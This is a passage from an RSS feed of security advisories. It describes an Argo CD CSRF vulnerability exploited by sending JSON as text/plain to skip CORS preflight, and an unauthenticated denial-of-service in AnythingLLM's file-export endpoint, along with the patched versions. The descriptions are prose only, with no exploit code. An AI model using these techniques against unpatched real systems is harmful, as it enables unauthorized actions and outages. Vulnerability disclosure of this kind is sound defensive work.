(CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD. A CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim’s behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code. Argo CD uses the “Lax” SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request. Many companies host Argo CD on an internal subdomain. If an attacker can place malicious code on, for example, https://test.internal.example.com/, they can still perform a CSRF attack. In this case, the “Lax” SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API. Browsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a “preflight request” for POSTs with content type “application/json” asking the destination API “are you allowed to accept requests from my domain?” If the destination API does not answer “yes,” the browser will block the request. Before the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser’s CORS check by setting the content type to something which is considered “not sensitive” such as “text/plain.” The browser wouldn’t send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code). A patch for this vulnerability has been released in the following Argo CD versions: 2.10-rc2, 2.9.4, 2.8.8, and 2.7.15. The patch contains a breaking API change. The Argo CD API will no longer accept non-GET requests which do not specify application/json as their Content-Type. The accepted content types list is configurable, and it is possible (but discouraged) to disable the content type check completely. Users are advised to upgrade. There are no known workarounds for this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:50:26 +0000</pubDate></item><item><title>CVE-2024-22422 | Unauthenticated Denial of Service (DOS) attack in AnythingLLM</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22422</link><description>AnythingLLM is an application that turns any document, resource, or piece of content into context that any LLM can use as references during chatting. In versions prior to commit `08d33cfd8` an unauthenticated API route (file export) can allow attacker to crash the server resulting in a denial of service attack. The “data-export” endpoint is used to export files using the filename parameter as user input. The endpoint takes the user input, filters it to avoid directory traversal attacks, fetches the file from the server, and afterwards deletes it. An attacker can trick the input filter mechanism to point to the current directory, and while attempting to delete it the server will crash as there is no error-handling wrapper around it. Moreover, the endpoint is public and does not require any form of authentication, resulting in an unauthenticated Denial of Service issue, which crashes the instance using a single HTTP packet. This issue has been addressed in commit `08d33cfd8`. Users are advised to upgrade. There are no known workarounds for this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:50:27 +0000</pubDate></item></channel></rss>